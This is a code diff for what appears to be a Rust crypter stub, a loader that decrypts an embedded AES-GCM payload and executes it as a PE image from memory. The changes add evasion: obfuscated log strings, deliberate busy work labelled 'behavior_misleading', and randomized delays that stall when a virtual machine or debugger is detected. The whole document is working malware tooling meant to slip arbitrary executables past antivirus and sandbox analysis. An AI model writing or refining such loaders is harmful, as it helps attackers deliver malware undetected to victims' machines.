@@ -1,4 +1,4 @@
-mod generated;
+// mod generated;
 mod logger;
 use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};
 use std::fs;
@@ -10,6 +10,8 @@ use aes_gcm::{
 };
 use std::convert::TryInto;
 use busywork::{BusyWork, Categories, Intensity};
+use obfstr::obfstr;
+
 
 // Embedded at compile time by the crypter.
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
@@ -40,7 +42,7 @@ fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, String> {
     let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("AES-GCM decrypt failed: {:?}", e))?;
 
     if VERBOSE {
-        logger::log_info("Binary decrypted successfully.");
+        logger::log_info(obfstr!("Binary decrypted successfully."));
     }
 
     Ok(plaintext)
@@ -49,16 +51,16 @@ fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, String> {
 fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
     let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).map_err(|e| format!("Failed to load executable: {e}"))?;
     module.execute_entry_point().map_err(|e| format!("Failed to execute entry point: {e}"))?;
-
-    if VERBOSE {
-        logger::log_ok("Target program executed.");
-    }
-
     Ok(())
 }
 
-fn behavior_misleading() {
-    BusyWork::new(Intensity::High).allow(Categories::COMPUTE | Categories::MEMORY).run();
+fn behavior_misleading(duration_secs: u64) {
+    let target = Duration::from_secs(duration_secs);
+    let start = Instant::now();
+    let worker = BusyWork::new(Intensity::High).allow(Categories::COMPUTE | Categories::MEMORY);
+    while start.elapsed() < target {
+        worker.run();
+    }
 }
 
 fn delay_execution() {
@@ -66,36 +68,30 @@ fn delay_execution() {
         if VERBOSE {
             logger::log_info(&format!("Delaying execution by {} seconds...", DELAY_SECS));
         }
-
-        let target = Duration::from_secs(DELAY_SECS);
-        let start = Instant::now();
-
-        while start.elapsed() < target {
-            behavior_misleading();
-        }
+        behavior_misleading(DELAY_SECS);
     }
 }
 
 fn run() -> Result<(), Box<dyn Error>> {
     std::hint::black_box(&PADDING);
 
+    delay_execution();
+
     if VM_DETECTION && vm_detected() {
         if VERBOSE {
-            logger::log_info("VM detected. Exiting...");
+            logger::log_info(obfstr!("VM detected. Exiting..."));
         }
-        behavior_misleading();
+        behavior_misleading(rand::thread_rng().gen_range(60..120)); // Random delay between 60 and 120 seconds
         return Ok(());
     }
 
     if debugger_detected() {
         if VERBOSE {
-            logger::log_info("Debugger detected. Exiting...");
+            logger::log_info(obfstr!("Debugger detected. Exiting..."));
         }
-        behavior_misleading();
+        behavior_misleading(rand::thread_rng().gen_range(60..120)); // Random delay between 60 and 120 seconds
         return Ok(());
     }
-
-    delay_execution();
 
     let ciphertext = decompress()
         .map_err(|e| format!("Failed to decompress payload: {e}"))?;
@@ -111,7 +107,7 @@ fn run() -> Result<(), Box<dyn Error>> {
 fn main() {
     if let Err(error) = run() {
         if VERBOSE {
-            logger::log_error(&format!("Error: {error}"));
+            logger::log_error(obfstr!(&format!("Error: {error}")));
         }
         std::process::exit(1);
     }
